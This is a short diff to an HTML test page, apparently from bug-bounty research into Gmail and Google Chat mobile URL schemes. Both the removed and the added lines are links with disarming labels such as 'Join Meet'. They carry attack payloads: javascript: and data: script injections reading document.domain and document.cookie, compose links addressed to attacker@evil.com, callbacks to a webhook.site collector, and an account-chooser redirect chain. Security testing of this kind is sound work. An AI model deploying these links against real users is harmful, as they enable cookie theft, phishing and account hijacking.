@@ -6,11 +6,11 @@
 </head>
 <body>
     <!-- index.html -->
-    <a href="googlegmail-x-callback://x-callback-url/co/compose?to=attacker@evil.com&x-success=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Join Meet (Test 1)</a>
-    <a href="googlegmail-x-callback://x-callback-url/auth?client_id=123&x-success=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Conference Test (Test 2)</a>
-    <a href="googlegmail-x-callback://x-callback-url/meet/join?url=https://meet.google.com/abc-defg-hij&x-success=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Account Confusion Test</a>
-    <a href="googlegmail://conversation/?conversationID=12345&account=malik.sahil1723@gmail.com">Account Confusion Test</a>
-    <a href="com.google.chat://conversation/?conversationID=12345&account=malik.sahil1723@gmail.com">Account Confusion Test</a>
-    <a href="googlegmail://co/compose?to=attacker@evil.com&account=malik.sahil1723@gmail.com">Account Confusion Test</a>
+    <a href="googlegmail://x-thread://mobile-webview.gmail.com/v1/index.html?url=data:text/html,<script>alert('XSS')</script>">Join Meet (Test 1)</a>
+    <a href="googlegmail://x-thread://mobile-webview.gmail.com/?url=javascript:alert(document.domain)">Conference Test (Test 2)</a>
+    <a href="x-thread://mobile-webview.gmail.com/v1/index.html?url=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Account Confusion Test</a>
+    <a href="googlegmail-x-callback://x-callback-url/co/compose?to=attacker@evil.com&x-success=javascript:alert('XSS')">Account Confusion Test</a>
+    <a href="googlegmail-x-callback://x-callback-url/meet/join?url=javascript:alert(document.cookie)">Account Confusion Test</a>
+    <a href="https://accounts.google.com/AccountChooser?continue=googlegmail://x-thread://mobile-webview.gmail.com/?url=https://webhook.site/fc53efdf-43dc-49b9-be17-535ddf3cf956">Account Confusion Test</a>
 </body>
 </html>
